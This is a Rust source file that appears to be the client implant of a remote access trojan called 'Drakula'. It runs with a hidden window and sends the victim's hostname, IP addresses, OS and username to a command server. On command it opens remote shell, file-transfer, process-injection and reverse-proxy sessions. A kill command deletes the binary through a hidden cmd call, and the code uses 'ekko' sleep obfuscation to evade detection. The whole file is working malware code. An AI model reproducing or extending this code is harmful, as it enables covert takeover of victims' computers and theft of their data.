#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use BByte_util::{
    close_all_session_in_lock, cur_timestamp_secs,
    gen::CONNECTION_INFO_FLAG,
    packet::{Heartbeat, HostInfo, Message},
    protocol::ClientWrapper,
    session::{Session, SessionBase, SessionManager},
    DrakulaClientMsgID, DrakulaProtocol, DrakulaServerCommandID, SlaveDNA, HEART_BEAT_TIME,
};
use lazy_static::*;
use std::sync::atomic::Ordering::Relaxed;
use std::{
    str::FromStr,
    sync::{atomic::AtomicU64, mpsc::channel, Arc, Mutex},
    time::Duration,
};
use systemstat::{Ipv4Addr, Platform, System};
use uuid::Uuid;
use std::process;
mod config;
mod module;
mod msgbox;

use module::shell::ShellClient;

use tokio::sync;
 
use crate::{config::master_configure, module::ftp::FtpClient, module::inject::InjectClient, module::rpoxy::RproxyClient  };

use std::os::windows::process::CommandExt;
const CREATE_NO_WINDOW: u32 = 0x08000000;

const G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
    flag: CONNECTION_INFO_FLAG,
    size: [0u8; 8],
    data: [0u8; 1024],
};

lazy_static! {
    static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    // if not write the line , G_CONNECTION_INFO will compile inline to origin code.
    static ref G_DNA : SlaveDNA = G_CONNECTION_INFO;
}

use std::process::{Command, Stdio};
use std::env;
use std::time::{SystemTime, UNIX_EPOCH};

use std::thread;
use reqwest::blocking::get;
use serde_json::Value;
fn get_current_unix_time() -> Result<u64, Box<dyn std::error::Error>> {
    let now = SystemTime::now();

    // Преобразуем в timestamp (количество секунд с Unix-эпохи)
    let timestamp = now.duration_since(UNIX_EPOCH)
        .expect("Ошибка: время до Unix-эпохи!")
        .as_secs();
    Ok(timestamp)
}
fn start_time_check_thread(expiration_unix_time: u64) {
    thread::spawn(move || {
        loop {
       
            match get_current_unix_time() {
                Ok(current_unix_time) => {
             
                    if current_unix_time >= expiration_unix_time {
                       
                        std::process::exit(0) 
                    }

                    
                    let remaining_time = expiration_unix_time - current_unix_time;
               
                }
                Err(e) => {
                    eprintln!("Ошибка   {}", e);
                }
            }

          
            thread::sleep(Duration::from_secs(30));
        }
    });
}

use module::ekko::ekko;

use tokio::sync::mpsc;
use tokio::task;
use tokio::time::{sleep};

use crate::module::rprox::main2::rproxy;

// #[tokio::main]
#[tokio::main]
 async  fn main() -> ! { 

    let (stop_tx, stop_rx) = mpsc::channel::<()>(32);     
   
    let stop_rx = Arc::new(tokio::sync::Mutex::new(stop_rx));
 
    let stop_rx_clone = Arc::clone(&stop_rx);
     
  

    #[cfg(debug_assertions)]
    {
        // morf function
        let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
        let sleep_time = 2200;
        ekko(sleep_time, &mut  key_buf);
    }
    #[cfg(debug_assertions)]
    {
        simplelog::CombinedLogger::init(vec![
            simplelog::TermLogger::new(
                log::LevelFilter::Warn,
                simplelog::Config::default(),
                simplelog::TerminalMode::Mixed,
                simplelog::ColorChoice::Auto,
            ),
            simplelog::WriteLogger::new(
                log::LevelFilter::Info,
                simplelog::Config::default(),
                std::fs::File::create("my_rust_binary.log").unwrap(),
            ),
        ])
        .unwrap();
    }

    let clientid = Uuid::new_v4().to_string();

    let shell_session_mgr: SessionManager<ShellClient> = SessionManager::new();
    let shell_session_mgr = Arc::new(Mutex::new(shell_session_mgr));

    let ftp_session_mgr: SessionManager<FtpClient> = SessionManager::new();
    let ftp_session_mgr = Arc::new(Mutex::new(ftp_session_mgr));

    let inj_session_mgr: SessionManager<InjectClient> = SessionManager::new();
    let inj_session_mgr = Arc::new(Mutex::new(inj_session_mgr));

    let kill_session_mgr: SessionManager<InjectClient> = SessionManager::new();
    let kill_session_mgr = Arc::new(Mutex::new(kill_session_mgr));

    let rprox_session_mgr: SessionManager<RproxyClient> = SessionManager::new();
    let rprox_session_mgr = Arc::new(Mutex::new(rprox_session_mgr));

    let shell_session_mgr_1 = shell_session_mgr.clone();
    let ftp_session_mgr_1 = ftp_session_mgr.clone();
    let inj_session_mgr_1 = inj_session_mgr.clone();
    let kill_session_mgr_1 = kill_session_mgr.clone();
    let rprox_session_mgr_1 = rprox_session_mgr.clone();
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
        let mut shell_session = shell_session_mgr_1.lock().unwrap();
        let mut ftp_session = ftp_session_mgr_1.lock().unwrap();
        let mut inj_session = inj_session_mgr_1.lock().unwrap();
        let mut kill_session = kill_session_mgr_1.lock().unwrap();
        let mut rprox_session = rprox_session_mgr_1.lock().unwrap();

        log::info!("shell session : {}", shell_session.count());
        log::info!("ftp session : {}", ftp_session.count());
        log::info!("ftp session : {}", inj_session.count());
        log::info!("kill session : {}", kill_session.count());
        log::info!("rprox session : {}", rprox_session.count());

        shell_session.gc();
        ftp_session.gc();
        inj_session.gc();
        kill_session.gc();
        rprox_session.gc();
    });

    let config = master_configure();
 
    log::debug!("master config : {:?}", config);

    let (stop_tx, stop_rx) = mpsc::channel(32);

 
    let stop_rx = Arc::new(tokio::sync::Mutex::new(stop_rx));

 
    
    
    loop {
        close_all_session_in_lock!(shell_session_mgr);
        close_all_session_in_lock!(ftp_session_mgr);
        close_all_session_in_lock!(inj_session_mgr);
        close_all_session_in_lock!(kill_session_mgr);
        close_all_session_in_lock!(rprox_session_mgr);
        
        let (session_sender, session_receiver) = channel::<SessionBase>();

        let mut client: ClientWrapper = match ClientWrapper::connect(
            &DrakulaProtocol::from(config.protocol),
            &config.address,
        ) {
            Ok(p) => p,
            Err(e) => {
                log::info!("connect faild : {}", e);
                std::thread::sleep(Duration::from_secs(5));
                continue;
            }
        };

        log::info!("connect success!");
        #[cfg(debug_assertions)]
        {
            // morf function
            let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
            let sleep_time = 2200;
            ekko(sleep_time, &mut  key_buf);
        }
        let hostname = whoami::hostname();

        let sys = System::new();
        let ips = match sys.networks() {
            Ok(netifs) => {
                let mut ret = String::new();
                for netif in netifs.values() {
                    for i in &netif.addrs {
                        match i.addr {
                            systemstat::IpAddr::V4(p) => {
                                if p == Ipv4Addr::from_str("127.0.0.1").unwrap() {
                                    continue;
                                }
                                ret += &format!("{},", p);
                            }
                            _ => {}
                        }
                    }
                }
                ret
            }
            Err(_) => "UNKNOW".to_string(),
        };

        let info = os_info::get();
        let os = format!("{} {} {}", info.os_type(), info.bitness(), info.version());

        let hostinfo = HostInfo {
            ip: ips,
            host_name: hostname,
            os,
            whoami: whoami::username(),
            remark: config.remark.clone(),
            loader:false
        };

        let mut buf =
            match Message::build(DrakulaClientMsgID::HostInfo.to_u8(), &clientid, hostinfo) {
                Ok(p) => p,
                Err(e) => {
                    log::error!("make HostInfo packet faild : {}", e);
                    client.close();
                    continue;
                }
            };

        match client.send(&mut buf) {
            Ok(p) => p,
            Err(e) => {
                log::error!("send HostInfo packet faild : {}", e);
                client.close();
                continue;
            }
        };

        let (sender, receriver) = channel::<Vec<u8>>();

        let mut client_1 = client.clone();
        std::thread::spawn(move || loop {
            let mut buf = match receriver.recv() {
                Ok(p) => p,
                Err(e) => {
                    log::info!("sender channel closed : {}", e);
                    break;
                }
            };

            G_OUT_BYTES.fetch_add(buf.len() as u64, Relaxed);

            match client_1.send(&mut buf) {
                Ok(p) => p,
                Err(e) => {
                    log::info!("sender channel closed : {}", e);
                    client_1.close();
                    break;
                }
            };
            log::info!("id : {} send [{}] bytes", buf[0], buf.len());
        });

        let mut client_2 = client.clone();
        let clientid_1 = clientid.clone();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                //flush in & out transfer rate
                let in_rate = G_IN_BYTES.load(Relaxed);
                let out_rate = G_OUT_BYTES.load(Relaxed);

                G_IN_BYTES.store(0, Relaxed);
                G_OUT_BYTES.store(0, Relaxed);

                let heartbeat = Heartbeat {
                    time: cur_timestamp_secs(),
                    in_rate,
                    out_rate,
                };
                log::info!("inrate : {} , outrate : {}", in_rate, out_rate);
                let buf = match Message::build(
                    DrakulaClientMsgID::Heartbeat.to_u8(),
                    &clientid_1,
                    heartbeat,
                ) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("make Heartbeat packet faild : {}", e);
                        break;
                    }
                };

                match sender_1.send(buf) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("send Heartbeat packet to channel faild : {}", e);
                        break;
                    }
                };

                std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            }
            client_2.close();
        });

        std::thread::spawn(move || loop {
            let base = match session_receiver.recv() {
                Ok(p) => p,
                Err(e) => {
                    log::info!("session receiver channel closed : {}", e);
                    break;
                }
            };

            let buf = Message::build(
                DrakulaClientMsgID::SessionPacket.to_u8(),
                &base.clientid,
                base.packet,
            )
            .unwrap();

            match sender.send(buf) {
                Ok(p) => p,
                Err(e) => {
                    log::info!("session receiver closed : {}", e);
                    break;
                }
            };
        });
        #[cfg(debug_assertions)]
        {
            // morf function
            let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
            let sleep_time = 2200;
            ekko(sleep_time, &mut  key_buf);
        }
        
        log::info!(" clientid :{}", &clientid);
        loop {
            match client.recv() {
                
                Ok(buf) => {
                    G_IN_BYTES.fetch_add(buf.len() as u64, Relaxed);
                    log::info!("recv [{}] bytes", buf.len());
                    let dd: String = format!("{}",String::from_utf8_lossy(&buf));

                    if !buf.is_empty() {
                        let first_byte = buf[0];
                        log::info!("First byte: 0x{:02X} ({})", first_byte, first_byte);
                    } else {
                        log::info!("Buffer is empty, no first byte");
                    }


                    log::info!("{}",dd);
                    match DrakulaServerCommandID::from(buf[0]) {
                        
                        
                        DrakulaServerCommandID::Rproxy => {
                            println!("reverse prox");
                            let text: String = format!("{}",String::from_utf8_lossy(&buf));
                            log::info!("Connection from: {:?}", client.local_addr().unwrap());
                         
                            log::info!("{}",text);
                            if buf[1] == 1 {
                                // Выполняем действия, если buf[1] равен 1
                                
                                let slice = &buf[2..];
                                let port = String::from_utf8_lossy(slice);
                                let mut ip_pats = config.address.split(':');
                                let ip = ip_pats.next().unwrap_or("");
                                let ip_port = format!("{}{}",ip,port);
                                println!("{}",ip_port);
                                log::info!("{}", ",START REVESE PROXY ");

                                let stop_rx_clone = Arc::clone(&stop_rx); // Клонируем для каждой итерации
                                let handle = tokio::spawn(async move {
                                    let args = vec![
                                        "rproxy".to_string(),
                                        "-r".to_string(),
                                        ip_port,
                                    ];
                                    if let Err(e) = rproxy(args, stop_rx_clone).await {
                                        eprintln!("rproxy error: {}", e);
                                    }
                                }) ;
                                
                            
 
                            } else if buf[1] == 0 {
                                log::info!("Connection from: {:?}", client.local_addr().unwrap());
                                let stop_tx_clone = stop_tx.clone();

                                tokio::spawn(async move {
                                    sleep(Duration::from_secs(1)).await;
                                    stop_tx_clone.send(()).await.expect("Не удалось отправить сигнал");
                                    println!("Сигнал остановки отправлен");
                                });
                            
                                log::info!("{}", " равен 0, STOP REVERSE PROXY");
                            } else {
                                // Обработка других значений, если необходимо
                                log::info!( "buf[1] имеет неожиданное значение: {}", buf[1]);
                            }

                            // let msg = match Message::new(
                            //     client.local_addr().unwrap(),
                            //     DrakulaProtocol::TCP,
                            //     &buf,
                            // ) {
                            //     Ok(p) => p,
                            //     Err(e) => {
                            //         log::error!("create shell session faild : {}", e);
                            //         continue;
                            //     }
                            // };
                            // let session = RproxyClient::new_client(
                            //     session_sender.clone(),
                            //     &clientid,
                            //     &msg.parser_sessionpacket().unwrap().id,
                            // )
                            // .unwrap();


                            // rprox_session_mgr.lock().unwrap().register(session);
                       
                            
                        }

                        DrakulaServerCommandID::KillBot => {
                            // log::info!("create KILL BOT session");

                            log::info!("Connection from: {:?}", client.local_addr().unwrap());
                            let current_exe = env::current_exe().expect("");

                            let _ = Command::new("cmd")
                            .args(&[
                                "/C",
                                "timeout",
                                "/T",
                                "4",
                                "&&",
                                "del",
                                current_exe.to_str().unwrap(),
                            ])
                            .stdout(Stdio::null()) 
                            .creation_flags(CREATE_NO_WINDOW)
                            .spawn()
                            .expect("Failed to execute command");

                            // std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));

                            process::exit(0);
                            
                         
                        }
                        DrakulaServerCommandID::Shell => {
                            log::info!("Connection from: {:?}", client.local_addr().unwrap());
                            log::debug!("create shell session");
                            let msg = match Message::new(
                                client.local_addr().unwrap(),
                                DrakulaProtocol::TCP,
                                &buf,
                            ) {
                                Ok(p) => p,
                                Err(e) => {
                                    log::error!("create shell session faild : {}", e);
                                    continue;
                                }
                            };
                            log::info!("&msg.: {:?}",&msg.parser_sessionpacket().unwrap().data);
                            let session = ShellClient::new_client(
                                session_sender.clone(),
                                &clientid,
                                &msg.parser_sessionpacket().unwrap().id,
                            )
                            .unwrap();
                            shell_session_mgr.lock().unwrap().register(session);
                        }
                        DrakulaServerCommandID::Loader => {
 
                        }
                        DrakulaServerCommandID::Inject => {
                            let msg = Message::new(
                                client.local_addr().unwrap(),
                                DrakulaProtocol::TCP,
                                &buf,
                            )
                            .unwrap();
                            let session = InjectClient::new_client(
                                session_sender.clone(),
                                &clientid,
                                &msg.parser_sessionpacket().unwrap().id,
                            )
                            .unwrap();
                            inj_session_mgr.lock().unwrap().register(session);
                        }
                        DrakulaServerCommandID::File => {
                            let msg = Message::new(
                                client.local_addr().unwrap(),
                                DrakulaProtocol::TCP,
                                &buf,
                            )
                            .unwrap();
                            let session = FtpClient::new_client(
                                session_sender.clone(),
                                &clientid,
                                &msg.parser_sessionpacket().unwrap().id,
                            )
                            .unwrap();
                            ftp_session_mgr.lock().unwrap().register(session);
                        }
                        DrakulaServerCommandID::SessionPacket => {
                            log::info!("message text {:?}",  dd);
                            log::info!("Connection from: {:?}", client.local_addr().unwrap());
                            let msg = Message::new(
                                client.local_addr().unwrap(),
                                DrakulaProtocol::TCP,
                                &buf,
                            )
                            .unwrap();
                            let packet = msg.parser_sessionpacket().unwrap();

                            log::info!("recv session packet  {:?}", packet);
 
                            shell_session_mgr
                                .lock()
                                .unwrap()
                                .write(&packet.id, &packet.data)
                                .unwrap();
                            ftp_session_mgr
                                .lock()
                                .unwrap()
                                .write(&packet.id, &packet.data)
                                .unwrap();
                            inj_session_mgr
                            .lock()
                            .unwrap()
                            .write(&packet.id, &packet.data)
                            .unwrap();
                            kill_session_mgr
                            .lock()
                            .unwrap()
                            .write(&packet.id, &packet.data)
                            .unwrap();

                        
                        }
                        DrakulaServerCommandID::Unknow => {}
                    }
                }
                Err(e) => {
                    log::error!("connection recv faild : {}", e);
                    client.close();
                    break;
                }
            }
        }
    }
}
